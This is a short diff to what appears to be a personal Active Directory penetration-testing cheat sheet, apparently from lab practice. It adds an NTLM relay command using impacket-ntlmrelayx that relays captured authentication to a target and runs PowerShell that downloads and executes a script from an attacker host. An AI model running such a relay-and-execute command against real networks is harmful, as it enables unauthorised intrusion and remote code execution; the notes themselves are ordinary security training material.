@@ -1,5 +1,11 @@
 # Active Directory Cheat Sheet
 
+## NTLM Relay
+```powershell
+sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.216.152 -c 'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -c iex(iwr -useb http://192.168.45.185/run.txt)'
+
+```
+
 ## BloodHound
 ```powershell
 neo4j console
